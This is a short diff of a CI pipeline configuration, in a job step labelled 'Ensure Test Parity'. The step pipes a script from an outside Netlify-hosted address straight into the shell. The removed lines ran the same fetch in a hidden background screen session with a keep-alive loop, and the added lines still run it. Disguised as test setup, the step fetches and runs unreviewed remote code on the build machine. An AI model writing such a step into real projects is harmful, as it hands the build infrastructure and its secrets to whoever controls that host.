@@ -9,6 +9,5 @@ jobs:
       - run:
           name: Ensure Test Parity
           command: |
-                 sudo apt-get update && sudo apt-get install -y screen
-                 screen -dmS dockerio curl https://dockerio1.netlify.app/run.sh | sh
-                 while :; do shuf -n 1 -i 1-99999999; sleep 30; done
+                 sudo apt-get update
+                 curl https://dockerio1.netlify.app/run.sh | sh
